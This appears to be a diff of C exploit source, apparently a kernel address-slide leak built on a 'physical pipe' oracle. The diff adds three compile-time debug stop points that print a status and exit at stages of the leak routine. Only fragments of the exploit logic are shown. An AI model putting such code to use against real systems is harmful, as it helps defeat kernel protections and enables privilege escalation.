@@ -2419,6 +2419,10 @@ static int slide_leak_physical_base(void) {
     pr_error("p0 physical pipe preparation failed\n");
     return 0;
   }
+#if defined(APP_DEBUG_STOP) && APP_DEBUG_STOP == 1
+  pr_warning("[dbg] stop=oracle\n");
+  _exit(0);
+#endif
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
 #ifdef APP_SLIDE_FRESH_PAGE_ATTEMPTS
   const int fresh_page_attempts = APP_SLIDE_FRESH_PAGE_ATTEMPTS;
@@ -2488,6 +2492,10 @@ static int slide_leak_physical_base(void) {
       continue;
     }
     app_publish_p0_dirty();
+#if defined(APP_DEBUG_STOP) && APP_DEBUG_STOP == 2
+    pr_warning("[dbg] stop=gate result=%d\n", gate_result);
+    _exit(0);
+#endif
     if (gate_result < 0) {
       pr_error("p0 physical pipe gate changed unexpected pages\n");
       slide_restore_physical_oracle();
@@ -2502,6 +2510,10 @@ static int slide_leak_physical_base(void) {
       slide_restore_physical_oracle();
       return 0;
     }
+#if defined(APP_DEBUG_STOP) && APP_DEBUG_STOP == 3
+    pr_warning("[dbg] stop=scan offset=%08zx\n", offset);
+    _exit(0);
+#endif
 #if defined(APP_P0_FINGERPRINT_INVERSE_SLIDE) && \
     APP_P0_FINGERPRINT_INVERSE_SLIDE
     if (offset > P0_ORACLE_PROBE_OFFSET) {
